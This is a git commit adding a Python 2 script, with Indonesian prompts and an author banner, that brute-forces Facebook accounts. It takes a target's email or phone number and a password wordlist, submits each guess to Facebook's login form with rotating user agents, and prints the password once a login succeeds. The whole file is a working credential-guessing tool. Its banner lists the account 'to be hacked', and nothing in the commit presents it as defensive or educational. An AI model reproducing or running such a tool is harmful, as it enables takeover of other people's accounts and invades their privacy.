66dd3410715a8412323d8c8566b20fd385c08b71
joshuairsa <46302737+joshuairsa@users.noreply.github.com>
2019-03-13 03:06:34 +0700

    Android Python
    It's Funny Moment Haha :v

---
+++ HydraBruteForce.py
@@ -0,0 +1,201 @@
+#!/usr/bin/env python
+
+
+# -*- coding: UTF-8 -*-
+
+
+
+import sys
+
+
+import mechanize
+
+
+import cookielib
+
+
+import random
+
+
+
+
+
+
+email = str(raw_input("Masukkan Username Atau Email, Nomor Hp : "))
+
+
+
+
+passwordlist = str(raw_input("Masukkan nama file wordlist & Tempat penyimpanan nya : "))
+
+
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+
+
+def main():
+
+
+	global br
+
+
+	br = mechanize.Browser()
+
+
+	cj = cookielib.LWPCookieJar()
+
+
+	br.set_handle_robots(False)
+
+
+	br.set_handle_redirect(True)
+
+
+	br.set_cookiejar(cj)
+
+
+	br.set_handle_equiv(True)
+
+
+	br.set_handle_referer(True)
+
+
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+
+
+	welcome()
+
+
+	search()
+
+
+	print("Password Telah DiTemukan !! ")
+
+
+
+
+
+def brute(password):
+
+
+	sys.stdout.write("\r[*] Proses ..... {}\n".format(password))
+
+
+	sys.stdout.flush()
+
+
+	br.addheaders = [('User-agent', random.choice(useragents))]
+
+
+	site = br.open(login)
+
+
+	br.select_form(nr = 0)
+
+
+	br.form['email'] = email
+
+
+	br.form['pass'] = password
+
+
+	sub = br.submit()
+
+
+	log = sub.geturl()
+
+
+	if log != login and (not 'login_attempt' in log):
+
+
+			print("\n\n[+] Password DiTemukan= {}".format(password))
+
+
+			raw_input("ANY KEY to Exit....")
+
+
+			sys.exit(1)
+
+
+
+
+def search():
+
+
+	global password
+
+
+	passwords = open(passwordlist,"r")
+
+
+	for password in passwords:
+
+
+		password = password.replace("\n","")
+
+
+		brute(password)
+
+
+
+
+#welcome 
+
+
+def welcome():
+
+
+	wel = """
+
++=========================================+
+
+|.......... Hydra Brute Force Facebook V.1 ...........|
+
++-----------------------------------------+
+
+| #Author: @Joshua_Ir$A| 
+| #Facebook : Joshua Irsa
+|	 Version 1.0 |
+| Channel Youtube : VoltHz Official |
+
++=========================================+
+
+|.......... Hydra Brute Force Facebook V.1 ...........|
+
++-----------------------------------------+\n\n
+
+""" 
+
+
+	total = open(passwordlist,"r")
+
+
+	total = total.readlines()
+
+
+	print (wel) 
+
+
+	print " [*] Akun Yang Ingin Di Retas : {}".format(email)
+
+
+	print " [*] Melihat Jumlah Wordlist..:" , len(total), "passwords"
+
+
+	print " [*] Cracking, Silahkan di tunggu ...\n\n"
+
+
+
+
+if __name__ == '__main__':
+
+
+	main()
+
